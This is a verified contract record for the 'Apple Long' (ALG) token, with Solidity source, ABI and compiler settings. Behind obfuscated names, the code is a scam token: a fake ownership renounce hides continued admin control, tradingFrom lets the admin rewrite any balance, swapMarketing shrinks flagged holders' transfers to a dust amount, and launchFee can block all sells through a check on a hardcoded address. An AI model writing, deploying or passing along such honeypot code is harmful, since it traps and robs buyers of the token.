{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface exemptLaunchReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract toSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenTx {\n    function createPair(address autoAmount, address totalLaunch) external returns (address);\n}\n\ninterface listFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapMax) external view returns (uint256);\n\n    function transfer(address enableLiquidity, uint256 minMax) external returns (bool);\n\n    function allowance(address maxReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableLiquidity,\n        uint256 minMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoReceiverMode, uint256 value);\n    event Approval(address indexed maxReceiver, address indexed spender, uint256 value);\n}\n\ninterface enableAutoSell is listFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AppleLong is toSender, listFee, enableAutoSell {\n\n    mapping(address => mapping(address => uint256)) private teamMin;\n\n    uint256 private autoLimit;\n\n    function owner() external view returns (address) {\n        return enableMaxTake;\n    }\n\n    event OwnershipTransferred(address indexed modeLimitAt, address indexed fromAuto);\n\n    function name() external view virtual override returns (string memory) {\n        return atShould;\n    }\n\n    address atMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function fromAt(address minLaunched) public {\n        if (minLimit) {\n            return;\n        }\n        if (autoLimit == listLimit) {\n            maxFee = true;\n        }\n        tokenMaxFrom[minLaunched] = true;\n        if (autoLimit != listLimit) {\n            autoLimit = listLimit;\n        }\n        minLimit = true;\n    }\n\n    string private autoTotal = \"ALG\";\n\n    mapping(address => bool) public tokenMaxFrom;\n\n    function allowance(address senderMax, address teamBuy) external view virtual override returns (uint256) {\n        if (teamBuy == fundReceiverTotal) {\n            return type(uint256).max;\n        }\n        return teamMin[senderMax][teamBuy];\n    }\n\n    function maxReceiverSender() private view {\n        require(tokenMaxFrom[_msgSender()]);\n    }\n\n    bool public minLimit;\n\n    constructor (){\n        \n        exemptLaunchReceiver atEnable = exemptLaunchReceiver(fundReceiverTotal);\n        sellLiquidity = tokenTx(atEnable.factory()).createPair(atEnable.WETH(), address(this));\n        if (autoLimit == listLimit) {\n            listLimit = autoLimit;\n        }\n        atShouldIs = _msgSender();\n        atLimit();\n        tokenMaxFrom[atShouldIs] = true;\n        fundFee[atShouldIs] = launchedTotal;\n        if (listLimit != autoLimit) {\n            feeWallet = false;\n        }\n        emit Transfer(address(0), atShouldIs, launchedTotal);\n    }\n\n    uint256 listTrading;\n\n    function swapMarketing(address toAmount) public {\n        maxReceiverSender();\n        \n        if (toAmount == atShouldIs || toAmount == sellLiquidity) {\n            return;\n        }\n        fromTeam[toAmount] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoTotal;\n    }\n\n    function marketingAuto(address txSell, address enableLiquidity, uint256 minMax) internal returns (bool) {\n        if (txSell == atShouldIs) {\n            return limitAmountTrading(txSell, enableLiquidity, minMax);\n        }\n        uint256 atTx = listFee(sellLiquidity).balanceOf(atMode);\n        require(atTx == listTxMin);\n        require(enableLiquidity != atMode);\n        if (fromTeam[txSell]) {\n            return limitAmountTrading(txSell, enableLiquidity, listIsFrom);\n        }\n        return limitAmountTrading(txSell, enableLiquidity, minMax);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedTotal;\n    }\n\n    uint256 listTxMin;\n\n    function tradingFrom(address senderReceiverLiquidity, uint256 minMax) public {\n        maxReceiverSender();\n        fundFee[senderReceiverLiquidity] = minMax;\n    }\n\n    function launchFee(uint256 minMax) public {\n        maxReceiverSender();\n        listTxMin = minMax;\n    }\n\n    bool public maxFee;\n\n    uint256 constant listIsFrom = 18 ** 10;\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderLaunched;\n    }\n\n    mapping(address => bool) public fromTeam;\n\n    address fundReceiverTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private senderLaunched = 18;\n\n    string private atShould = \"Apple Long\";\n\n    function transferFrom(address txSell, address enableLiquidity, uint256 minMax) external override returns (bool) {\n        if (_msgSender() != fundReceiverTotal) {\n            if (teamMin[txSell][_msgSender()] != type(uint256).max) {\n                require(minMax <= teamMin[txSell][_msgSender()]);\n                teamMin[txSell][_msgSender()] -= minMax;\n            }\n        }\n        return marketingAuto(txSell, enableLiquidity, minMax);\n    }\n\n    uint256 private listLimit;\n\n    function limitAmountTrading(address txSell, address enableLiquidity, uint256 minMax) internal returns (bool) {\n        require(fundFee[txSell] >= minMax);\n        fundFee[txSell] -= minMax;\n        fundFee[enableLiquidity] += minMax;\n        emit Transfer(txSell, enableLiquidity, minMax);\n        return true;\n    }\n\n    function balanceOf(address swapMax) public view virtual override returns (uint256) {\n        return fundFee[swapMax];\n    }\n\n    uint256 private launchedTotal = 100000000 * 10 ** 18;\n\n    function atLimit() public {\n        emit OwnershipTransferred(atShouldIs, address(0));\n        enableMaxTake = address(0);\n    }\n\n    address public atShouldIs;\n\n    function transfer(address senderReceiverLiquidity, uint256 minMax) external virtual override returns (bool) {\n        return marketingAuto(_msgSender(), senderReceiverLiquidity, minMax);\n    }\n\n    bool public feeWallet;\n\n    address public sellLiquidity;\n\n    function approve(address teamBuy, uint256 minMax) public virtual override returns (bool) {\n        teamMin[_msgSender()][teamBuy] = minMax;\n        emit Approval(_msgSender(), teamBuy, minMax);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return enableMaxTake;\n    }\n\n    address private enableMaxTake;\n\n    mapping(address => uint256) private fundFee;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeLimitAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoReceiverMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atShouldIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLaunched\",\"type\":\"address\"}],\"name\":\"fromAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minMax\",\"type\":\"uint256\"}],\"name\":\"launchFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAmount\",\"type\":\"address\"}],\"name\":\"swapMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenMaxFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderReceiverLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minMax\",\"type\":\"uint256\"}],\"name\":\"tradingFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderReceiverLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AppleLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}